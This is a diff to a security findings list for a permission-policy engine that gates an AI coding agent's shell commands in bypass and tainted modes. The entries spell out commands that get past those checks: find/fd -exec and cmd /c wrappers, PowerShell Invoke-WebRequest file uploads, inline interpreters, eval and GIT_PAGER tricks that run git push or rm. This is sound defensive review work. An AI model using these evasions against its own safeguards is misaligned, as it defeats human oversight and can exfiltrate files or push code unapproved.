@@ -238,13 +238,21 @@ When fixed, move the entry to "Fixed" and add `- **Fixed:** #<PR>`.
 - `fd -x git push` and `fd -X git config '{}'` are allowed in tainted `bypassPermissions`: the command `fd` runs per match is never unwrapped, so it gets no remote-action check. Unwrap `fd -x`/`--exec`/`-X`/`--exec-batch` like `find -exec`, with `{}` (and `{/}`, `{.}`, …) as a run-time word.
 - Extended (F77 round-2 security review): `FIND_EXEC` matches the program name, so GNU find installed as `gfind` (Homebrew findutils) isn't unwrapped either: `gfind . -exec git push \;` allows in tainted bypass.
 
+### F100 (F78 security review): PowerShell uploads aren't remote actions
+- **Severity:** major (pre-existing) · `src/policy/decide/remote.ts` (the §4.8 remote-action list)
+- In tainted `bypassPermissions`, PowerShell `curl -T a.ts https://x` (bash denies the same text as "curl upload"), `Invoke-WebRequest -Uri https://x -Method Post -InFile a.ts` and `iwr https://x -Method Post -InFile a.ts` are allowed: the remote list doesn't read `Invoke-WebRequest`/`Invoke-RestMethod` uploads, nor `curl` under PowerShell (where `curl` is `Invoke-WebRequest` in Windows PowerShell 5.1 and the real curl in pwsh 7).
+
+### F101 (F78 security review): deny rules don't see through `cmd /c`; inline interpreters stay understood
+- **Severity:** minor (pre-existing) · `src/policy/rules/evaluate.ts` (rule matching), `src/policy/shell-parse/bash.ts`
+- With `PowerShell(git push *)` or `Bash(rm *)` denied, untainted bypass allows `cmd /c git push` and `cmd /c rm x`: the remote check unwraps `cmd /c`, rule matching doesn't. `python3 -c 'import os;os.system("git push")'`, `perl -e`, `node -e` and `awk 'BEGIN{system(…)}'` are understood, so tainted bypass allows them (default asks, `dontAsk` denies).
+
 ## Fixed
 
 ### F78 (F76 security review): a command the analyzer doesn't understand still allows in tainted bypass
 - **Severity:** major (pre-existing) · `src/policy/decide/decide.ts` (the `understood` check), `src/policy/shell-parse/powershell.ts`
 - `eval "git push"` (bash, `understood: false`, reason `eval`) and PowerShell `$env:GIT_PAGER = 'git push'; git log` / `[Environment]::SetEnvironmentVariable('GIT_PAGER','git push'); git log` (unsupported assignment/invocation syntax, `commands` = `[git log]`) are allowed in tainted `bypassPermissions`. F51 made `commands: undefined` ask; an analysis with `understood: false` and some commands read should ask too (deny in `dontAsk`), or the PowerShell analyzer should read `$env:` assignments as assignments. Extended (F76 round-3 security review): `set -a; : "${GIT_PAGER:=git push}"; git log` allows in bash — `set -a` exports a variable a `:=` expansion sets. Extended (F76 rethink): PowerShell `sh -c "gi$()t push"` and `& "gi$()t" push` allow too. Extended (F77 security review): evaluators and launchers whose argument is a command line aren't read as what they run: `eval git config core.pager x`, PowerShell `Invoke-Expression 'git push'` and `Start-Process git -ArgumentList 'push'` (or `'config','core.pager','x'`) allow in tainted bypass, while `bash -c`/`cmd /c` are unwrapped; unwrap them like `bash -c` or count them as a possible push.
 - **Decided:** ask in bypass only when tainted or a deny rule exists (permissions §4.0 item 10), not for every command that is not fully understood.
-- **Fixed (PR TBD):** bypass asks for a parsed command that isn't understood while tainted or when a deny rule names the tool (§4.0 item 10); `pwsh`/`powershell`, `Invoke-Expression` and `Start-Process` are never understood, and `Invoke-Expression` holds sandbox auto-allow like `eval` (QUESTIONS Q111).
+- **Fixed (PR TBD):** bypass asks for a parsed command that isn't understood while tainted or when a deny rule names the tool, Read or Edit (§4.0 item 10); evaluators and launchers (`trap`, other shells, `wsl`, `start`, PowerShell's `Invoke-Expression`, `Start-Process`, alias definitions, …) are never understood, a `cmd /c` layer running a launcher asks, and `Invoke-Expression` holds sandbox auto-allow like `eval` (QUESTIONS Q111).
 
 ### F77 (F76 security review): `git config` writes configuration that runs a program, unchecked
 - **Severity:** major (pre-existing) · `src/policy/decide/remote.ts` (`gitHidden`), §4.4b
